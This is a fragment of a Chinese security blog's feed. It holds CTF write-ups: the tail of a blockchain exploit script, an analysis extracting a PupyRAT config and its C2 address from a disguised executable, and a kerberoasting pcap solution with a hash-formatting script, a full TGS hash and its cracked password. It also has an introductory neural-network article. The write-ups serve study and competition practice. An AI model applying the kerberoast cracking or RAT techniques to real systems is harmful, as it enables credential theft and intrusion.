<span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">contract.functions.attack().transact(&#123;<span class="string">&#x27;value&#x27;</span>: value&#125;)</span><br><span class="line">contract.functions.getflag().transact()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(contract.functions.flag().call())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/NepCTF2024-Writeup/image-20240827002735921.png" alt="image-20240827002735921"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Academic </tag>
            
            <tag> NepCTF </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客2024初赛 Misc 简历复现</title>
      <link href="/2024/08/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/08/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>又是被暴打的一集。。。跟上次京麒ctf一样，盯着下面这道misc看了一天，然后成功爆零。。。不想说什么了（T0T）</p><p>后来通过与<del>从某些途径搞来的</del>官方wp比对，发现——还是和上次京麒ctf一样，就差最后一步了。。。已经到了flag跟前，然后不会了。。。不说了，开始复现（T0T）</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目给了一个叫做张小可 英语教师简历.png.exe的程序</p><h2 id="与答案相同部分"><a href="#与答案相同部分" class="headerlink" title="与答案相同部分"></a>与答案相同部分</h2><p>先对这个程序进行查壳（这里改名为了1.exe）</p><img src="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819213235689.png" alt="image-20240819213235689" style="zoom: 67%;" /><p>upx脱壳</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819213332522.png" alt="image-20240819213332522"></p><p>接下来的步骤正常应该是通过对1.exe逆向，来分析其进行的恶意行为。但是多捣鼓捣鼓也不难弄出来，下面就写我比赛时<del>瞎捣鼓</del>的做法了。</p><h2 id="我的方法"><a href="#我的方法" class="headerlink" title="我的方法"></a>我的方法</h2><p>foremost分解1.exe，得到简历图片</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819214026169.png" alt="image-20240819214026169"></p><img src="/images/巅峰极客2024初赛-Misc-简历复现/image-20240819214120025.png" alt="image-20240819214120025" style="zoom:67%;" /><p>发现存在lsb隐写，得到一个网址</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819214347437.png" alt="image-20240819214347437"></p><p>直接访问，下载得到一个default.a文件</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819214517377.png" alt="image-20240819214517377"></p><p>拖进010</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819214817604.png" alt="image-20240819214817604"></p><p>可以看到其中存在大量的yyttddd，所以肯定是整体异或yyttddd（这里生成的文件命名为download.exe）</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819215052897.png" alt="image-20240819215052897"></p><p>binwalk一下，得到一个叫做14728.7z的文件</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819221321688.png" alt="image-20240819221321688"></p><p>7zip识别不出来，用trid识别一下，应该是个lzma压缩文件，改一下后缀</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819221534911.png" alt="image-20240819221534911"></p><p>当时比赛的时候我就是卡在这儿了。。。</p><p>实际上，只要写个python脚本加载一下数据就行了。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> pylzma</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;14728.lzma&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data = pylzma.decompress(data)</span><br><span class="line">tmp = marshal.loads(data)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819221819896.png" alt="image-20240819221819896"></p><p>可以看出c2服务器的ip地址就是60.177.118.44:3432</p><h2 id="预期方法（后半部分）"><a href="#预期方法（后半部分）" class="headerlink" title="预期方法（后半部分）"></a>预期方法（后半部分）</h2><p>前面已经说过了，到异或yyttddd其实都可以通过对1.exe进行逆向推出来，因此这里就不说了，从得到download.exe开始说。</p><p>我们将download.exe丢进virustotal分析一下可以发现这其实是一个pupyrat的马</p><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819223954231.png" alt="image-20240819223954231"></p><p>download.exe实际上后面跟着一个lzma格式的配置文件，提取出来就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> pylzma</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;final.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">index = data.find(<span class="string">b&#x27;\x5d\x00\x00\x80\x00\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> index == -<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LZMA signature not found, skipped&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    data = pylzma.decompress(data[index:])</span><br><span class="line">    tmp = marshal.loads(data)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/image-20240819224318318.png" alt="image-20240819224318318"></p><p>可以看出c2服务器的ip地址就是60.177.118.44:3432</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> 巅峰极客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024-Writeup</title>
      <link href="/2024/08/16/MoeCTF2024-Writeup/"/>
      <url>/2024/08/16/MoeCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="Wrtieup"><a href="#Wrtieup" class="headerlink" title="Wrtieup"></a><a href="https://www.blog.st4rr.top/writeups/MoeCTF2024Writeup.pdf">Wrtieup</a></h3>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jqctf2024决赛 Misc kerberoasting复现</title>
      <link href="/2024/08/08/jqctf2024%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/08/08/jqctf2024%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有幸跟着X1cT34m的学长们京东总部打了京麒CTF的决赛，结果我盯着下面这道misc题看了一天，然后爆零了(T0T)，队伍排名也不理想，给队里的师傅们磕一个了(T0T)。。。Orz</p><p>赛后我找了出题人，询问后发现，我最最开始得到的答案三问有两问是对的（这题总共有三个问题）。。。结果后面越改越离谱，错的那问仍然一直是错的。。。我还是再沉淀沉淀吧(</p><p>下面是对这题的复现</p></blockquote><p>题目给了一个流量包kerberoasting.pcapng，要求找出以下三问的答案，拼起来求md5值就是flag：</p><p>1、总共枚举到了几个kerberoastable的用户</p><p>2、攻击者得到的kerberoastable的用户的密码</p><p>3、攻击者通过kerberoasting攻击得到权限后进行了约束委派攻击，找出与服务端存在委派关系的用户名称</p><p>首先过滤一下ldap流，可以看到其中有一条查询请求查询到了4个用户</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808152623844.png" alt="image-20240808152623844"></p><p>进一步展开可以看到，这些用户都设置了SPN，因此可以判定他们就是kerberoastable的用户</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808152809412.png" alt="image-20240808152809412"></p><p>接下来过滤一下krb5流翻找，很快就可以看到这四个用户返回的TGS-REP</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808153013132.png" alt="image-20240808153013132"></p><p>展开可以看到返回的票据，其中可以找到enc-part的cipher部分，这一部分其实就是用户密码的hash值</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240808163841079.png" alt="image-20240808163841079"></p><p>但是直接用这个值肯定是不行的，需要爆破需要有一定的格式，我们可以用下面的脚本去生成正确的格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encType = <span class="string">&quot;23&quot;</span></span><br><span class="line">userName = <span class="string">&quot;&quot;</span></span><br><span class="line">domain = <span class="string">&quot;&quot;</span></span><br><span class="line">spn = <span class="string">&quot;&quot;</span></span><br><span class="line">cipherText = <span class="string">&quot;&quot;</span></span><br><span class="line">formatted_string = <span class="string">&quot;$krb5tgs$&#123;0&#125;$*&#123;1&#125;$&#123;2&#125;$&#123;3&#125;*$&#123;4&#125;$&#123;5&#125;&quot;</span>.<span class="built_in">format</span>(encType, userName, domain, spn, cipherText[:<span class="number">32</span>],</span><br><span class="line">                                                               cipherText[<span class="number">32</span>:])</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br></pre></td></tr></table></figure><p>对于用户VictoriaOrbit，我们可以得到如下的1.hash文件</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*VictoriaOrbit$WHOAMIANONY.COM$whoamianony.com/VictoriaOrbit*$4f5376a8c1190acb1dfb054d25a6e75d$c7a192b7cf3277dff22d0580cb58ea74b6d329823b8e2f0b6eb6cf6b9da5b02e4eb2c4c3aee69dfaff8d7c6d6fa6a7790b565d360864049e647164c51ea1840e5a9a9d14e046848a7e406ec2d2b35966b515b1a18d2805207b3142b6e160884a99e4b823682759d69ad4d83ab5eb3112997507c3deb60e035091aecd215684a719796b87b430d79b47e93a6b205ee42d2a74f3f0a5d2266fb6bc081e346b2f1fc15dc07b1bec60b02d03e9bbc1db72c1c4baa2d16c4f2d001d4fb43f881d1d4d8f1b768c18e01b925fb034d86020380c2cebce4bd0486c223f7f5acb065272c1f7dad806f10f940fbf916861395f766fec9b018a5456cd6a236c314fb8691698dc2c8f41c4ba496a5c33b2dcc97223c6f067c0f10b890668921b34f5d53f42f768086cb2466bd2e15bf18859064d1e7f7282513f5ddefa4dc5e03e29b3f040b35c2342ca833108a3ead9a515a29fd515c63696caedad27ff3de3ead2dbd20619ca743f2797d91a3f4a77a763c9cabf09106887c0d9f02c8a572cb5763c3cbd10e026a69e25b8953dfec41320f42928ae79df79afb8031201264d9c4d22ecc2aaddda2a249ebd1deb89948deb39b485b7870c103ffc667e803a2a2ea99c549274baa3b68d59e6e4865302ed4cd78887255584b91453185aefa3f98e95107c83a9891fc26332e5f2ba71b3f48af6e698176fb7e1304406d10c76343e2e7bc72c948ca93da839629d4f107fad8bc7b5a062fae5ef4f7afbe46862c61b8113bc9ec844d8638c4cebc6b0609d3ad4fb70042b537dba62b58ade791629e342a634e6906711c6e64360ae36aa479a7fcfa6cb3ef7725a74620ddcec820bc56b8975943bb9b89d9dec3a85e2159e15b3dbccfe3d44ef9e6c690287af61271f3250b983f5c266a45444e228e1409c537bb8c00a2cb416597305a0f16443028e6bd35126d77a759b353b4a082810ba4f19b0981dd28aa185628b3a4756b2ec3a39adbc1db2c3d4667b98d306fe668a2316d21029e5070c67fea7737bf174b9dac48f8bd717685c9623f595b0201504b416285b333f073da88d47f7af8ab74b712c08073fc34dabfdaa5d952c070e93e4303287ae420752633d4115caf697eaf75b06277601961476ad0b05ff2679259443486512c90d032945a1f8a3e6707af0e23b6958ea758fbaf46034cddc42a9f38f213806d96aecf6868f0dde4acc3c522c2e337af2215d7eebe0792d4b8151a221e9465bd49058551dc8023a036448b43aab5b8afc7a3615b4d39e97c3efdb455f11c36ddc1172e51a6fabda60573452b23c338d335a7d5b3a6f8cced00b83232331add275432e837b197cee6d095f6ae95e95107c50c0e1532b4445db8395f08594c0e4682d521c2580cdf1452426af7278a4e0dbbbba0d87a926c16249a0ff5976eb65d0ee6603803e57b7621d632f048a4cd5852acdb3be2860806efca2fb616c609ff6e383289c1a232df775992edbe8c7ee2f6915ab8d807d41f00a6618062a2425b40421c45a1eae5d86af38b8</span><br></pre></td></tr></table></figure><p>接下来就是经典操作，用工具john the ripper，字典rockyou.txt进行爆破，得到明文密码4xVictoriax4</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240809000422154.png" alt="image-20240809000422154"></p><p>最后就是找存在委派关系的用户，当时比赛时我就是卡在这里了。。。然而事实上这很简单。。。</p><p>还是过滤ldap流，查看msDS-AllowedToDelegatedTo的部分，即可找到用户名WIN-CORP16</p><p><img src="/images/jqctf%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/image-20240809001029442.png" alt="image-20240809001029442"></p><p>所以最终答案是4_4xVictoriax4_WIN-CORP16</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> jqctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅学AI</title>
      <link href="/2024/07/31/%E6%B5%85%E5%AD%A6AI/"/>
      <url>/2024/07/31/%E6%B5%85%E5%AD%A6AI/</url>
      
        <content type="html"><![CDATA[<blockquote><p>简单学点AI，防止以后CTF中遇到AI就寄。。。</p><p>本文内容多为搬运+修补，所搬运文章链接在文末</p></blockquote><h2 id="朴素感知机、神经元"><a href="#朴素感知机、神经元" class="headerlink" title="朴素感知机、神经元"></a>朴素感知机、神经元</h2><p>感知机接收多个输入信号，输出一个信号。感知机的信号只有“流 &#x2F; 不流”（1&#x2F;0）两种取值。这里我们认为 0 对应“不传递信号”， 1 对应“传递信号”。最简单的感知机就是将输入进行处理得到中间结果，再将结果经过非线性函数处理输出。一般的，我们也把上述的模型称为<strong>神经元</strong> ，又称作<strong>节点</strong>(node)或<strong>单元</strong>(unit)。</p><h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><p>由多个神经元可组成<strong>神经网络</strong>。每个节点可以从其他节点接收输入，或者从外部源接收输入，然后计算输出。每个输入都各自的<strong>权重</strong>（weight，即 w），用于调节该输入对输出影响的大小，节点的结构如图所示：</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/image-20240731212540830.png" alt="image-20240731212540830"></p><p>其中 x1, x2 作为该节点的输入，其权重分别为 w1 和 w2。同时，还有配有<strong>偏置</strong>b（bias）的输入 ，偏置的主要功能是为每一个节点提供可训练的常量值（在节点接收的正常输入以外）。</p><h2 id="多层感知机"><a href="#多层感知机" class="headerlink" title="多层感知机"></a>多层感知机</h2><p>多层感知机（Multilayer Perceptron）缩写为 MLP，也称作前馈神经网络（Feedforward Neural Network）。它是一种基于神经网络的机器学习模型，通过多层非线性变换对输入数据进行高级别的抽象和分类。下图显示了一个最典型的 MLP，它包括包括三层： <strong>输入层、隐层（全连接层）和输出层</strong> （全连接的意思就是：上一层的任何一个神经元与下一层的所有神经元都有连接）。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-2110a4d62384a277ab700907e73e8721_b.gif" alt="动图"></p><p>它的工作分为两部分:</p><ul><li><strong>前向传播</strong> ：输入数据被馈送到输入层，然后传递到隐藏层，并最终生成输出层的输出。每一层的每一个神经元都会计算其加权输入和非线性激活函数的输出。</li><li><strong>反向传播</strong> ：在训练过程中，输出与期望的输出进行比较，产生一个误差值。这个误差随后被反向传播到网络中，权重得到相应的更新。</li></ul><h3 id="向前传播的计算"><a href="#向前传播的计算" class="headerlink" title="向前传播的计算"></a>向前传播的计算</h3><p>让我们把上面的 MLP 细节化：</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-5a81c06789ad5e9323f93c6540263327_r.jpg" alt="img"></p><p>在一般情况下，参与运算的各元素都是 <strong>矩阵</strong>，其中的蓝色方块代表着 <strong>激活函数</strong>，绿色方块代表着 <strong>权重 Weight</strong> 和 <strong>偏置 Bias</strong> 。需要注意的是， ***权重和偏置对应上图中不同神经元的连线***，例如 1-&gt; 3 和 1-&gt; 4 的参数不同。详细计算方式如下图及下式：</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-ec822b0f10066f097a074e1ff09167b1_r.jpg" alt="img"></p><p>在分类问题中，最后的输出层元素个数一般等于分类数目，最终的结果代表着该输入被这个 MLP 分为某一类的可能性大小，指越大，代表越可能属于该类。为了便于观测，我们通常使用 softmax 函数将将上一层的原始数据进行归一化，转化为一个(0,1)(0,1) 之间的数值，这些数值可以被当做概率分布，用来作为多分类的目标预测值。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-4452fdaaa04686aa270010f57f4db2aa_r.jpg" alt="img"></p><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>激活函数可为神经元引入非线性因素，使神经网络能够处理更复杂的问题。如果没有激活函数，那么神经网络将变为由一个巨大的线性组合构成。</p><h2 id="BP误差反向传播法"><a href="#BP误差反向传播法" class="headerlink" title="BP误差反向传播法"></a>BP误差反向传播法</h2><p>反向传播算法的核心概念是：<strong>通过比较现实输出与期望输出之间的差异，根据差异来反向更新每一层的参数，从而使现实输出更加贴近于期望输出。</strong></p><p>损失对参数梯度的反向传播可以被这样直观解释：由 A 到传播 B，即由 ∂L&#x2F;∂A∂L&#x2F;∂A 得到 ∂L&#x2F;∂B∂L&#x2F;∂B ，由导数链式法则 ∂L&#x2F;∂B&#x3D;(∂L&#x2F;∂A)⋅(∂A&#x2F;∂B)∂L&#x2F;∂B&#x3D;(∂L&#x2F;∂A)⋅(∂A&#x2F;∂B)。所以神经网络的 BP 就是通过链式法则求出L对所有参数梯度的过程。</p><p>如下图示例，输入x，经过网络的参数 w,b ，得到一系列中间结果 a,h 。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-d38c136a7b018fb3ea7344a902d0e3d1_r.jpg" alt="img"></p><p>下面是具体的推导公式</p><p>右上角的h21到a21:<br>$$<br>\frac{\partial l}{\partial a_{21}}&#x3D;\frac{\partial l}{\partial h_{21}}*\frac{\partial h_{21}}{\partial a_{21}}&#x3D;\frac{\partial l}{\partial h_{21}}*activate’(a_{21})<br>$$<br>a21到h11:<br>$$<br>L&#x3D;f(a_{21},a_{22},a_{23})\frac{\partial L}{\partial h_{11}}&#x3D;\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial h_{11}}+\frac{\partial L}{\partial a_{22}}\frac{\partial a_{22}}{\partial h_{11}}+\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial h_{11}}&#x3D;\frac{\partial L}{\partial a_{21}}w_1+\frac{\partial L}{\partial a_{22}}w_2+\frac{\partial L}{\partial a_{23}}w_3<br>$$</p><p>$$<br>\frac{\partial L}{\partial w_1}&#x3D;\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial w_1}&#x3D;\frac{\partial L}{\partial a_{21}}h_{11}<br>$$</p><p>$$<br>\frac{\partial L}{\partial b_{21}}&#x3D;\frac{\partial L}{\partial a_{21}}\frac{\partial a_{21}}{\partial b_{21}}&#x3D;\frac{\partial L}{\partial a_{21}}<br>$$</p><p>因此，我们可以如下图，将反向传播的表达式如下。</p><p><img src="/images/%E6%B5%85%E5%AD%A6AI/v2-4564c3328f7f007f2a046076cdac800a_r.jpg" alt="img"></p><p>当然并不是所有的反向传播都是如此即可，还有可能与向前传播时所用的激活函数有关，具体可查看<a href="https://hello-ctf.com/HC_AI/MLP/#_11">原文</a></p><p>参考文章：</p><p><a href="https://hello-ctf.com/HC_AI/MLP/">传送门一</a></p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024暑假偷偷练习CTF</title>
      <link href="/2024/07/28/2024%E6%9A%91%E5%81%87%E5%81%B7%E5%81%B7%E7%BB%83%E4%B9%A0CTF/"/>
      <url>/2024/07/28/2024%E6%9A%91%E5%81%87%E5%81%B7%E5%81%B7%E7%BB%83%E4%B9%A0CTF/</url>
      
        <content type="html"><![CDATA[<p>听说隔壁Dozer的f4k3r师傅校队有内部训练，偷偷过去玩了一下，这里放一下我和f4k3r师傅一起写的wp（未用于提交），方便以后查阅使用</p><p><a href="https://f4k3r.top/2024/07/10/%E4%B8%8E%E5%8D%97%E8%88%AA%E7%9A%84%E6%9A%91%E6%9C%9F%E8%81%94%E5%90%88%E8%AE%AD%E7%BB%83WP/">传送门一</a></p><p><a href="https://f4k3r.top/2024/07/28/%E8%81%94%E5%90%88%E8%AE%AD%E7%BB%83%E7%BB%93%E8%90%A5%E8%B5%9BWP/">传送门二</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟 2024 Misc 招新题 第一题（需要密码）</title>
      <link href="/2024/07/23/%E6%98%9F%E7%9B%9F-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/"/>
      <url>/2024/07/23/%E6%98%9F%E7%9B%9F-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6bb92ae3f65d55d43753c990f7cdd84398a7a70db03014a4eb8a2e79102a5d5b">825b23be34d6e48a379c92804d8d7913b80bfb012895b0b2a494eea7a99da8d9a8f92ba0a2640c516f4059eecd48968e09d7b3b1c9db24aac6327b82a3b813d8bd9ed1d83df9d509c685c5d2dcf92e56c7c84fcc5a7f3329e59af32b03165e8ee35b9196fcab97dedb6ded42c3e314b7e07d91d1e710dd5ef93aa1f972968721ee3199b7cd46c2d6ce84d33df79b47ebcb5105289eda79d9d416804b9604a8207c13c6dca7123e98e0b24dc76e14511e76154fa7ad72a225ebc2768d9ebc8f4984a405a3527e8da07653e0ead301e7935352bda18376908e1dc7b74688e00a1816ad468b32546972dc66a44cdcc9573eeccde1e3d50f4b00851c0523961a165610931f8d7b51212ab77aee3290c9b2ddc6ab44c65c25c80c06a3521c1fb050fb27f46a0339ec0e7990dbdf84dbd446aed604adef5cbe6c38b2fdec203f98527a8aef7236a2d4ac6cf256ca0c25d2430780bfc90197222988057903b15927a3bf3f23757d69ea022dd1fef1a43c5e47acb1c0ae23a2af938dc22cab9d7ad66a37602aa251dde7304330ca22e2b94c0fd8e328e10f1685811f79785843defed99ae58171c346ebbc298778e3686646023c4fa511c51205ee117942f2588fd9a9a46654007bec0c1a5f0ba19cf4ff902deab9a5e23eec1a236a42258c8b88828ab9c6a4d865de043474b5ec64048948d638a9dc3184cb8eef3f2a6e8b50a974014e3d45bb2555eaf80491703fba51e63094c8a7c4124cf74c0d024751873acee1c6486d73e938f65e2c4b8bdf19abba553b48f0138e20f32c50c523be3fbae072677efef1589371df2665d39bd34ed510c6b9f21c9d40cae3bce7ac36923aa15c821d6c3efdee7c2a87b39e430e37410c9ac3047972ac30400a2492734df157aba331fc7826ea37ae49a761c66ff319f075225bd861197318d377f8859e12eab0c4d86fb86213391ac32e7434fbad1ac61cd473bf1b370f865a34d32bf727fb25ee234324e904415f95645f34d80c0d02beab744689d1f2e3d1566af3c6d93d28a230461d42af794319ef2527c89d27e6370194a234ff6e20c750484a552c035505404f81907b6b34e2d2d3b1ce8b3152dbbebfe16577a2cd1ffd7751caed81e4dedc429fc0f29f1a2a03183a8ec554ef1984e91d30c1eb5e339d22914221c894e457f8c5e513a494824fb20ce1df485950596c6f8c7b48825ae4b1e003283ed3f6abb75fbf885ee4c8efcbbf4baaa94a7d9152873c7ef8bb23d6e9dcc596c258a95cb593efb3c2926ef40de8d04f43ada37cc024741ec51a5fcf7620476776bfcc5034d709cf405ddcb8c0b53f9c2c1b21f6f9ee861f4865a33855f0932244902a0620e9bac821468aa33fc6bf4b7472039dcc0392f564a05c699a73d38a703ea9994d96c5ec78ca0dc0071d175f8ad9a961b699f6870a96c1f13380e9ffdeef17669a1c86eef97d8649791c28c969d0426022e16cf9a3eca24c5bd5d58acc6272778dc9da0f60faa2a8786a6acfa3a803395833fd6ab4298d03453b549112faccd20a14d4f21f38459ac1920b8144599906ef791bb2695c434e4d13fd81a3b071eab4b09467235722e4f8d5ef8f150af8c1f02c92c06d0ddbefbbb071a98ab89f1d951907c09c1656ba4a78141da1d12f93cd2ef54c84e08f3d4563b33f4e92a37b43bdb8ea6509f215bfef964b9d8fc59a7b86e14405e766a29733fd684762a07e0a4d8483629c387abcf09be33e6580f254847fe5666f57b03010a23090b5a9e97126b940aa88366c5ad7441a9dfd6e793f3ad8e302430509e80ff11029828c50333b2b3c56cefcb49dc76e9366998d386a928b155f116d5c89b13b8cde2b28eee82f17f1cb9a76064d076a20a7990d2bcef89cbcfe9234989266c74d98e7c17aecaa0601da55449f5ac1e18e063b605f7820a796e9075c2f643cb5ee95796b79d234f73f04e3a997ebcfdcef312b6bdf3cedbe0e2c687efef35356b18cc6c169d315a4045da52fa17870951cc7f78ac95643faaa803c1205f53e8ea0a04001afd91b8df0c0d93a196060fe22d542df30693869b4aad98ab27141e6093c69dd0eabe4ac97abb69d9cb625456a2a3f7c1d38d2c22941ef292df80b2596d060844d0e213db0e2ecc1b0434e3c16d1c92b7b1dde35cd08a6058c99c82b45f4613af67dd0aed4dfd4fdb0ed0f7fcc5460145471874e4acd36c6f918c6bc4eb57beed0ff80fa71623f2a6ea80bfd0cc64b6c240a66c2b97b63ff019a98a05f9ef0bdcd46ad527779c4b6a4fc7d7712137c5b264bccf89eab91080fc13015bbb0e5f46916ce4a620b0f0d916787327fc9deda6b8a4736622b9818bd8731202a6220b82576e160670c86a63f7a544f2e3fe158f7fb7685619ca19c878d5d3575acada2a80708639cb89b5de57391588dde1ce8f7c2820ae3b5423352942d510146cc5dd88c43b10bb8b5e0d52ca